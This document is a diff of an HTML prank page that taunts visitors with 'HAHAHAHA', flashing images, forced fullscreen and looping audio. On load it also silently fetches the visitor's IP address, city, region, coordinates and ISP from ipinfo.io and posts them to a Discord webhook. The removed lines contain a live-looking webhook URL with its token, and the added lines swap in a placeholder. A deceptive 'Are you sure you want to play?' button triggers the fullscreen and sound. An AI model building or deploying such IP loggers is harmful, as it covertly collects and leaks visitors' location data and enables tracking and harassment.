@@ -44,14 +44,10 @@
                 background-image: url('jas2.png');
             }
         }
-        /* CSS to make the IP text red */
         .ip-text {
             color: red; /* Change the text color to red */
             font-weight: bold;
         }
-        
-        }
-        /* Positioning the IP results in the bottom left */
         #ipResult {
             position: absolute;
             bottom: 20px;
@@ -62,131 +58,113 @@
             padding: 10px;
             border-radius: 5px;
         }
+        .fullscreen-btn {
+            padding: 10px 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background-color: red;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
 
-<!-- Flashing background images -->
 <div class="background"></div>
 
-<!-- Main content with IP data -->
 <div class="content">
     <h2>HAHAHAHAHAHAHAHHA</h2>
     <div id="ipResult"></div>
 
-    <!-- Audio element with autoplay (muted initially) -->
+    <!-- Fullscreen Button -->
+    <button id="fullscreenBtn" class="fullscreen-btn">Are you sure you want to play?</button>
+
+    <!-- Audio element -->
     <audio id="sound" src="sound.mp3" autoplay loop muted></audio>
+</div>
 
-    <script>
-        // Function to get the IP address and geolocation
-        function getMyIpAddress() {
-            fetch("https://ipinfo.io/json")
-                .then(response => response.json())
-                .then(data => {
-                    // Fetch geolocation data from ipinfo.io
-                    fetch("https://ipinfo.io/" + data.ip + "/json")
-                        .then(response => response.json())
-                        .then(data => {
-                            var ipResultDiv = document.getElementById("ipResult");
-                            ipResultDiv.innerHTML = `
-                                <p><strong class="ip-text">IP Address:</strong> <span class="ip-text">${data.ip}</span></p>
-                                <p><strong class="ip-text">City:</strong> <span class="ip-text">${data.city}</span></p>
-                                <p><strong class="ip-text">Region:</strong> <span class="ip-text">${data.region}</span></p>
-                                <p><strong class="ip-text">Country:</strong> <span class="ip-text">${data.country}</span></p>
-                                <p><strong class="ip-text">Location:</strong> <span class="ip-text">${data.loc}</span></p>
-                                <p><strong class="ip-text">Organization:</strong> <span class="ip-text">${data.org}</span></p>
-                            `;
-                            // Send the data to Discord webhook
-                            sendToDiscord(data);
-                        })
-                        .catch(error => {
-                            var ipResultDiv = document.getElementById("ipResult");
-                            ipResultDiv.innerHTML = "<p>Error retrieving IP information.</p>";
-                            console.error("Error retrieving IP information:", error);
-                        });
-                })
-                .catch(error => {
-                    console.error("Error retrieving IP address:", error);
-                });
-        }
-
-        // Function to send IP information to Discord webhook
-        function sendToDiscord(data) {
-            var webhookUrl = "https://discord.com/api/webhooks/1322344664359239720/OP-GxUPNa6rkUfz52ovgWpFBd0aDhghLDaNpwuEc5XxaYJqahFqr4PwaDiKRaJYRFAg9"; // Your actual webhook URL
-            var payload = {
-                embeds: [
-                    {
-                        fields: [
-                            { name: "IP Address", value: data.ip, inline: true },
-                            { name: "City", value: data.city, inline: true },
-                            { name: "Region", value: data.region, inline: true },
-                            { name: "Country", value: data.country, inline: true },
-                            { name: "Location", value: data.loc, inline: true },
-                            { name: "Organization", value: data.org, inline: true }
-                        ],
-                        color: 0x903dfe, // Color hex value
-                        timestamp: new Date().toISOString()
-                    }
-                ]
-            };
-
-            // Send the payload to the Discord webhook
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(payload)
+<script>
+    function getMyIpAddress() {
+        fetch("https://ipinfo.io/json")
+            .then(response => response.json())
+            .then(data => {
+                fetch("https://ipinfo.io/" + data.ip + "/json")
+                    .then(response => response.json())
+                    .then(data => {
+                        const ipResultDiv = document.getElementById("ipResult");
+                        ipResultDiv.innerHTML = `
+                            <p><strong class="ip-text">IP Address:</strong> <span class="ip-text">${data.ip}</span></p>
+                            <p><strong class="ip-text">City:</strong> <span class="ip-text">${data.city}</span></p>
+                            <p><strong class="ip-text">Region:</strong> <span class="ip-text">${data.region}</span></p>
+                            <p><strong class="ip-text">Country:</strong> <span class="ip-text">${data.country}</span></p>
+                            <p><strong class="ip-text">Location:</strong> <span class="ip-text">${data.loc}</span></p>
+                            <p><strong class="ip-text">Organization:</strong> <span class="ip-text">${data.org}</span></p>
+                        `;
+                        sendToDiscord(data);
+                    })
+                    .catch(error => console.error("Error retrieving IP info:", error));
             })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Data sent to Discord successfully.");
-                } else {
-                    console.error("Error sending data to Discord.");
-                }
-            })
-            .catch(error => {
-                console.error("Error sending data to Discord:", error);
-            });
-        }
-
-        function requestFullScreen() {
-    const element = document.documentElement; // Select the entire page for fullscreen
-    if (element.requestFullscreen) {
-        element.requestFullscreen();
-    } else if (element.mozRequestFullScreen) { // For Firefox
-        element.mozRequestFullScreen();
-    } else if (element.webkitRequestFullscreen) { // For Chrome, Safari, and Opera
-        element.webkitRequestFullscreen();
-    } else if (element.msRequestFullscreen) { // For IE/Edge
-        element.msRequestFullscreen();
+            .catch(error => console.error("Error retrieving IP address:", error));
     }
-}
 
-// Trigger fullscreen on page load
-document.addEventListener("DOMContentLoaded", function () {
-    requestFullScreen();
-});
+    function sendToDiscord(data) {
+        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";
+        const payload = {
+            embeds: [
+                {
+                    fields: [
+                        { name: "IP Address", value: data.ip, inline: true },
+                        { name: "City", value: data.city, inline: true },
+                        { name: "Region", value: data.region, inline: true },
+                        { name: "Country", value: data.country, inline: true },
+                        { name: "Location", value: data.loc, inline: true },
+                        { name: "Organization", value: data.org, inline: true }
+                    ],
+                    color: 0xff0000,
+                    timestamp: new Date().toISOString()
+                }
+            ]
+        };
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).then(response => {
+            if (response.ok) {
+                console.log("Data sent to Discord successfully.");
+            } else {
+                console.error("Error sending data to Discord.");
+            }
+        }).catch(console.error);
+    }
 
+    function enterFullscreenAndPlay() {
+        const audio = document.getElementById("sound");
+        const element = document.documentElement;
 
-        // Function to start audio playback when clicking anywhere
-        function playAudioOnClick() {
-            var audio = document.getElementById("sound");
+        // Request fullscreen
+        if (element.requestFullscreen) element.requestFullscreen();
+        else if (element.mozRequestFullScreen) element.mozRequestFullScreen();
+        else if (element.webkitRequestFullscreen) element.webkitRequestFullscreen();
+        else if (element.msRequestFullscreen) element.msRequestFullscreen();
 
-            // Start audio when the user clicks anywhere on the page
-            audio.muted = false;  // Unmute the audio
-            audio.play();  // Play the sound
-        }
+        // Play audio
+        audio.muted = false;
+        audio.play().catch(error => console.error("Error playing audio:", error));
+    }
 
-        // Start the process when the page loads
-        document.addEventListener("DOMContentLoaded", function() {
-            // Set up click event listener to trigger the audio
-            document.body.addEventListener('click', playAudioOnClick);
+    document.addEventListener("DOMContentLoaded", function() {
+        // Add click event to fullscreen button
+        const fullscreenBtn = document.getElementById("fullscreenBtn");
+        fullscreenBtn.addEventListener("click", enterFullscreenAndPlay);
 
-            // Get IP address and geolocation
-            getMyIpAddress();
-        });
-    </script>
+        // Get IP address and geolocation
+        getMyIpAddress();
+    });
+</script>
 
 </body>
 </html>
